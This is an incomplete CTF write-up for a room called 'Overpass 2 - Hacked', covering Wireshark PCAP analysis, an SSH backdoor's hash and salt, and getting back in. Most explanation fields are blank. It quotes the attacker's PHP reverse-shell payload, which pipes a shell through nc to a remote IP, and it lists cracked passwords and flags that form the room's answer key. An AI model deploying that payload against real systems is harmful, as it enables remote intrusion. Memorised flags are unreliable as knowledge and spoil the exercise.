# Overpass 2 - Hacked
Overpass has been hacked! Can you analyse the attacker's actions and hack back in?

**Note:** This CTF expects you to be familiar with using tools and Linux CLI, but I will explain the best that I can as we walk through this room.

## Task 1 - *Forensics - Analyse the PCAP*

### 1. What was the URL of the page they used to upload a reverse shell?

**Analysis:** So we know that the attacker has **uploaded** some kind of payload to a **web server**. Knowing it's some type of interaction with a **web server**, I think we can safely assume that the protocol we should filter for in Wireshark is **HTTP**. <br>
![image](https://user-images.githubusercontent.com/85798849/222154541-e10bdb04-8dd1-46c6-8779-fb970c6bb297.png)
Now that we only see **HTTP** traffic, we now see an interesting **POST** request which contains the URL of the page that the attacker uploaded the payload to. <br>
*(Note: An HTTP POST request is used to send data to a server to create/update a resource.)*

**Answer:** `/development/` <br>

---

### 2. What payload did the attacker use to gain access?
**Analysis:** <br>

**Answer:** `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`\

**Q:** What password did the attacker use to privesc? \
**Mindset:** \
**Answer:** `whenevernoteartinstant` \
**Explaination:**

**Q:** How did the attacker establish persistence? \
**Mindset:** \
**Answer:** `https://github.com/NinjaJc01/ssh-backdoor` \
**Explaination:**

**Q:** Using the fasttrack wordlist, how many of the system passwords were crackable? \
**Mindset:** \
**Answer:** `4` \
**Explaination:**

## Task 2 - *Research - Analyse the code*

**Q:** What's the default hash for the backdoor? \
**Mindset:** \
**Answer:** `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3` \
**Explaination:**

**Q:** What's the hardcoded salt for the backdoor? \
**Mindset:** \
**Answer:** `1c362db832f3f864c8c2fe05f2002a05` \
**Explaination:**

**Q:** What was the hash that the attacker used? - go back to the PCAP for this! \
**Mindset:** \
**Answer:** `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed` \
**Explaination:**

**Q:** Crack the hash using rockyou and a cracking tool of your choice. What's the password? \
**Mindset:** \
**Answer:** `november16` \
**Explaination:**

## Task 3 - *Attack - Get back in!*

**Q:** The attacker defaced the website. What message did they leave as a heading? \
**Mindset:** \
**Answer:** `H4ck3d by CooctusClan` \
**Explaination:**

### Using the information you've found previously, hack your way back in!

**Q:** What's the user flag? \
**Mindset:** \
**Answer:** `thm{d119b4fa8c497ddb0525f7ad200e6567}` \
**Explaination:**

**Q:** What's the root flag? \
**Mindset:** \
**Answer:** `thm{d53b2684f169360bb9606c333873144d}` \
**Explaination:**
